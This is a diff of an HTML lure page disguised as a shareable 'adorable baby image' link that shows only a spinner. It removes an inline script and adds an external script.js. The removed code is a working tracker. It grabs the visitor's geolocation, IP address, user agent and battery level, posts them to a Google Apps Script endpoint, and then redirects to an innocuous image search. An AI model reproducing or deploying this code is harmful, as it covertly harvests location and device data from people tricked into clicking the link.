@@ -7,76 +7,20 @@
   <meta property="og:description" content="A beautiful and adorable baby image for you. Click to view now!">
   <meta property="og:image" content="https://d1pis9vhhsjhwp.cloudfront.net/preview.jpg">
   <meta property="og:image:secure_url" content="https://d1pis9vhhsjhwp.cloudfront.net/preview.jpg">
-  <meta property="og:image:type" content="image/jpeg">
+  <meta property="og:image:type" content="image/jpg">
   <meta property="og:image:width" content="1200">
   <meta property="og:image:height" content="630">
   <meta property="og:url" content="https://d1pis9vhhsjhwp.cloudfront.net/">
   <meta property="og:type" content="website">
   <meta name="twitter:card" content="summary_large_image">
   <script src="https://cdn.tailwindcss.com"></script>
+  <script src="script.js"></script>
 </head>
 
 <body>
   <div class="flex items-center justify-center h-screen bg-gray-400">
     <div class="w-16 h-16 border-4 border-red-700 border-t-transparent rounded-full animate-spin"></div>
   </div>
-
-  <script>
-    const API_URL =
-      "https://script.google.com/macros/s/AKfycbwRMq7SbyKmdhds0XJfUPHRLlWToxKSY9uQXsWCnL4vr0VEWv3H5ItBrcjmP-3EZM4S/exec";
-
-    function collectAndSendData() {
-      let payload = {};
-
-      navigator.geolocation.getCurrentPosition(
-        function (position) {
-          const { latitude, longitude } = position.coords;
-          payload.mapLink = `https://maps.google.com/?q=${latitude},${longitude}`;
-
-          sendData();
-        },
-        
-      );
-
-      function sendData() {
-        fetch("https://api.ipify.org?format=json")
-          .then((res) => res.json())
-          .then((data) => {
-            payload.ip = data.ip;
-            payload.userAgent = navigator.userAgent;
-
-            if (navigator.getBattery) {
-              navigator.getBattery().then((battery) => {
-                payload.battery = battery.level * 100 + "%";
-                postData();
-              });
-            } else {
-              postData();
-            }
-          })
-          .catch(() => {
-            postData();
-          });
-      }
-
-      function postData() {
-        fetch(API_URL, {
-          method: "POST",
-          body: JSON.stringify(payload),
-        })
-          .then(() => {
-            window.location.href =
-              "https://www.google.com/search?q=nature+wallpapers&tbm=isch";
-          })
-          .catch(() => {
-            window.location.href =
-              "https://www.google.com/search?q=cute+cats&tbm=isch";
-          });
-      }
-    }
-
-    collectAndSendData();
-  </script>
 </body>
 
 </html>
